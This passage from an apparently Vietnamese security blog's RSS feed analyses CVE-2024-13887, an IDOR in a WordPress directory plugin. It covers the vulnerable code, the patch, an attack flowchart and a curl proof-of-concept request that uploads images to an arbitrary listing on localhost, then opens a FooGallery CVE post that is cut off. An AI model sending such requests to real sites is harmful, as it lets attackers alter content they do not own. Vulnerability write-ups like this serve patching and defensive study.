wpbdp_render(&#xA;            &amp;#39;submit-listing-images-single&amp;#39;,&#xA;            array(&#xA;                &amp;#39;image_id&amp;#39;   =&amp;gt; $attachment_id,&#xA;                &amp;#39;listing_id&amp;#39; =&amp;gt; $listing_id,&#xA;            ),&#xA;            false&#xA;        );&#xA;    }&#xA;&#xA;    $has_images = $listing-&amp;gt;get_images( &amp;#39;ids&amp;#39; );&#xA;    $listing-&amp;gt;set_images( $attachments, true );&#xA;&#xA;    // Maybe set thumbnail if there aren&amp;#39;t already images on this listing.&#xA;    if ( ! $has_images ) {&#xA;        $image_id = reset( $attachments );&#xA;        $listing-&amp;gt;set_thumbnail_id( $image_id );&#xA;    }&#xA;&#xA;    if ( $errors ) {&#xA;        $error_msg = &amp;#39;&amp;#39;;&#xA;&#xA;        foreach ( $errors as $fname =&amp;gt; $error ) {&#xA;            $error_msg .= sprintf( &amp;#39;&amp;amp;#149; %s: %s&amp;#39;, $fname, $error ) . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;&#xA;        }&#xA;&#xA;        $res-&amp;gt;add( &amp;#39;uploadErrors&amp;#39;, $error_msg );&#xA;    }&#xA;&#xA;    $res-&amp;gt;add( &amp;#39;is_admin&amp;#39;, wpbdp_user_is_admin() );&#xA;    $res-&amp;gt;add( &amp;#39;slots_available&amp;#39;, $slots_available );&#xA;    $res-&amp;gt;add( &amp;#39;attachmentIds&amp;#39;, $attachments );&#xA;    $res-&amp;gt;add( &amp;#39;html&amp;#39;, $html );&#xA;    $res-&amp;gt;send();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán l·∫•y &lt;code&gt;listing_id&lt;/code&gt; v√† &lt;code&gt;images&lt;/code&gt; t·ª´ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;$files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;K·∫øt th√∫c h√†m n·∫øu plan ch∆∞a ƒë∆∞·ª£c ch·ªçn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$plan = $listing-&amp;gt;get_fee_plan();&#xA;if ( ! $plan ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#34; title=&#34;Ch·ªçn plan&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/plan.png&#34; data-sub-html=&#34;&lt;h2&gt;Plan&lt;/h2&gt;&lt;p&gt;Ch·ªçn plan&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#39; alt=&#34;Plan&#34; height=&#34;459&#34; width=&#34;705&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Ch·ªçn plan&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ ki·ªÉm tra slot c√≤n l·∫°i c√≥ th·ªÉ upload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;if ( 0 &amp;gt;= $slots_available ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;} elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;    return $res-&amp;gt;send_error(&#xA;        sprintf(&#xA;            _nx(&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                $slots_available,&#xA;                &amp;#39;listing image upload&amp;#39;,&#xA;                &amp;#39;business-directory-plugin&amp;#39;&#xA;            ),&#xA;            count( $files ),&#xA;            $slots_available&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#34; title=&#34;Slot&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/slot.png&#34; data-sub-html=&#34;&lt;h2&gt;Slot&lt;/h2&gt;&lt;p&gt;Slot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#39; alt=&#34;Slot&#34; height=&#34;439&#34; width=&#34;509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Slot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;slot &amp;lt;= 0&lt;/code&gt; th√¨ tr·∫£ v·ªÅ l·ªói. N·∫øu kh√¥ng, duy·ªát qua c√°c file v√† g·ªçi ƒë·∫øn &lt;code&gt;wpbdp_media_upload&lt;/code&gt; ƒë·ªÉ upload file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $i =&amp;gt; $file ) {&#xA;    $image_error   = &amp;#39;&amp;#39;;&#xA;    $attachment_id = wpbdp_media_upload(&#xA;        $file,&#xA;        true,&#xA;        true,&#xA;        array(&#xA;            &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;            &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;        ),&#xA;        $image_error&#xA;    ); // TODO: handle errors.&#xA;&#xA;    if ( $image_error ) {&#xA;        $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;    } else {&#xA;        $attachments[] = $attachment_id;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng h√†m s·∫Ω tr·∫£ v·ªÅ th√¥ng tin upload d·∫°ng JSON.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;l·ªó h·ªïng x·∫£y ra khi kh√¥ng c√≥ s·ª± r√†ng bu·ªôc gi·ªØa &lt;code&gt;listing_id&lt;/code&gt; v√† ng∆∞·ªùi d√πng ƒë∆∞·ª£c ph√©p th·ª±c hi·ªán upload, attacker c√≥ th·ªÉ th·ª±c hi·ªán upload images b·∫•t k√¨ th√¥ng qua vi·ªác thay ƒë·ªïi tham s·ªë &lt;code&gt;listing_id&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;B·∫£n v√° &lt;code&gt;v6.4.15&lt;/code&gt; ƒë√£ tri·ªÉn khai m·ªôt s·ªë bi·ªán ph√°p ƒë·ªÉ kh·∫Øc ph·ª•c:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#39; alt=&#34;Patch&#34; height=&#34;678&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán ki·ªÉm tra nonce b·∫±ng &lt;code&gt;check_ajax_referer&lt;/code&gt; =&amp;gt; ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra owner c·ªßa listing, n·∫øu kh√¥ng ph·∫£i s·∫Ω tr·∫£ v·ªÅ l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wpbdp_user_is_admin() &amp;amp;&amp;amp; ! $listing-&amp;gt;owned_by_user( get_current_user_id() ) ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;You do not have permission to upload images to this listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;WordPress triggers ajax_listing_submit_image_upload()&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;No authentication required (wp_ajax_nopriv_)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Extract listing_id from request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load listing object by ID&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Listing has fee plan?&amp;#34;}&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Return error: select a plan&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;Calculate remaining image slots&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;slots_available &amp;gt; 0?&amp;#34;}&#xA;&#xA;K -- No --&amp;gt; L[&amp;#34;Return error: no available slots&amp;#34;]&#xA;K -- Yes --&amp;gt; M[&amp;#34;Process uploaded files&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Call wpbdp_media_upload()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attach uploaded image to listing&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Set thumbnail if needed&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Return success response (JSON)&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Image successfully attached to arbitrary listing&amp;#34;]&#xA;&#xA;R --&amp;gt; S[&amp;#34;IDOR: No ownership / permission validation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST http://localhost/wp-admin/admin-ajax.php \&#xA;  -F &amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34; \&#xA;  -F &amp;#34;listing_id=88&amp;#34; \&#xA;  -F &amp;#34;images=@/path/to/image.jpg&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2024-13887 xu·∫•t ph√°t t·ª´ vi·ªác endpoint &lt;code&gt;wpbdp-listing-submit-image-upload&lt;/code&gt; cho ph√©p truy c·∫≠p kh√¥ng c·∫ßn x√°c th·ª±c v√† kh√¥ng ki·ªÉm tra quy·ªÅn s·ªü h·ªØu &lt;code&gt;listing_id&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p attacker upload h√¨nh ·∫£nh v√†o b·∫•t k·ª≥ listing h·ª£p l·ªá n√†o ch·ªâ b·∫±ng c√°ch thay ƒë·ªïi tham s·ªë ƒë·∫ßu v√†o. B·∫£n v√° 6.4.15 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·ªï sung ki·ªÉm tra nonce v√† x√°c th·ª±c quy·ªÅn s·ªü h·ªØu listing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;IDOR x·∫£y ra do thi·∫øu ki·ªÉm tra quy·ªÅn s·ªü h·ªØu t√†i nguy√™n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; l√† ƒëi·ªÉm t·∫•n c√¥ng nguy hi·ªÉm n·∫øu kh√¥ng c√≥ x√°c th·ª±c b·ªï sung.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o nh∆∞ &lt;code&gt;listing_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n k·∫øt h·ª£p &lt;strong&gt;authentication + authorization&lt;/strong&gt; khi x·ª≠ l√Ω AJAX endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin &amp;lt;= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-12114 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</link>
      <pubDate>Tue, 30 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;FooGallery ‚Äì Responsive Photo Gallery, Image Viewer, Justified, Masonry &amp;amp; Carousel&lt;/strong&gt; d√†nh cho &lt;strong&gt;WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Insecure Direct Object Reference&lt;/strong&gt; trong &lt;strong&gt;t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 2.4.29&lt;/strong&gt; th√¥ng qua h√†nh ƒë·ªông AJAX &lt;strong&gt;&lt;code&gt;foogallery_attachment_modal_save&lt;/code&gt;&lt;/strong&gt;, do &lt;strong&gt;thi·∫øu x√°c th·ª±c&lt;/strong&gt; ƒë·ªëi v·ªõi m·ªôt kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t (&lt;strong&gt;&lt;code&gt;img_id&lt;/code&gt;&lt;/strong&gt;).&lt;br&gt;&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c&lt;/strong&gt;, v·ªõi &lt;strong&gt;quy·ªÅn truy c·∫≠p ƒë∆∞·ª£c c·∫•p tr·ªü l√™n&lt;/strong&gt;, c√≥ th·ªÉ &lt;strong&gt;c·∫≠p nh·∫≠t n·ªôi dung c·ªßa b·∫•t k·ª≥ b√†i vi·∫øt ho·∫∑c trang n√†o&lt;/strong&gt;.&lt;br&gt;&#xA;T√°c ƒë·ªông th·ª±c s·ª± ch·ªâ x·∫£y ra khi &lt;strong&gt;thi·∫øt l·∫≠p vai tr√≤ Gallery Creator&lt;/strong&gt; ƒë∆∞·ª£c ƒë·∫∑t ·ªü m·ª©c &lt;strong&gt;th·∫•p h∆°n ‚ÄúEditor‚Äù&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-12114&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-12114&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.30&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/foogallery/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FooGallery&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.29&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.30&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng 